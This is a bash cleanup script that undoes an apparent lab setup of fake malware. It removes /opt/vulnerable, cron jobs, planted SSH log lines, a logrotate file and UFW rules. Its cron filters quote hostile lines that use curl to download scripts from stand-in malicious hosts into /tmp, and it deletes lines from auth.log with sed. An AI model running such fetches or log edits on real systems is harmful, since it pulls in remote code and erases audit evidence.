#!/bin/bash

# Step 1: Remove fake malware files and directories
sudo rm -rf /opt/vulnerable

# Step 2: Remove cron jobs
# The purpose of these commands is to remove the suspicious cron jobs related to the fake malware.
(sudo crontab -l | grep -v '/opt/vulnerable/malware.sh' | grep -v 'python3 /opt/vulnerable/exploit.py' | grep -v 'curl -s http://malicious-server.com/commands.sh -o /tmp/commands.sh' | grep -v 'curl -s https://another-malicious-server.com/update.sh -o /tmp/update.sh') | sudo crontab -

# Step 3: Remove fake SSH log entries
# The purpose of these commands is to remove the fake SSH log entries added during the setup.
sudo sed -i '/Accepted publickey for user from 192.168.0.1 port 22 ssh2: RSA SHA256:example/d' /var/log/auth.log
sudo sed -i '/Accepted password for user from 192.168.0.2 port 22 ssh2/d' /var/log/auth.log

# Step 4: Remove log rotation configuration
# The purpose of this command is to remove the log rotation configuration added during the setup.
sudo rm /etc/logrotate.d/vulnerable

# Step 5: Remove UFW rules added for this setup
# The purpose of these commands is to remove the UFW rules added during the setup.
sudo ufw delete deny from 192.168.0.1
sudo ufw delete deny from 192.168.0.2

echo "Cleanup complete. The server has been cleaned of all setup changes."
